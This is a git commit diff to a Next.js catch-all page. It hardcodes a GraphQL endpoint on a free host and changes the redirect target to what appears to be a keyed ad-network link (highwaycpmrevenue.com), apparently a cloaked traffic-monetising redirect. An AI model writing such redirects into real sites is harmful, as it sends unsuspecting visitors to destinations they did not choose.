22a8747f8d16f0df7241a4d5f534034776d90f2a
alfaisalzon <140403952+alfaisalzon@users.noreply.github.com>
2023-07-24 19:44:25 +0500

    Update [...postpath].tsx

--- Pages/[...postpath].tsx
+++ Pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = process.env.GRAPHQL_ENDPOINT as string;
+	const endpoint = "https://alfaisalzon.000webhostapp.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`  https://www.highwaycpmrevenue.com/tgv0s3fk?key=9a779b0a7549762e2bd675d57776d887 ` + encodeURI(path as string)
 				}`,
 			},
 		};
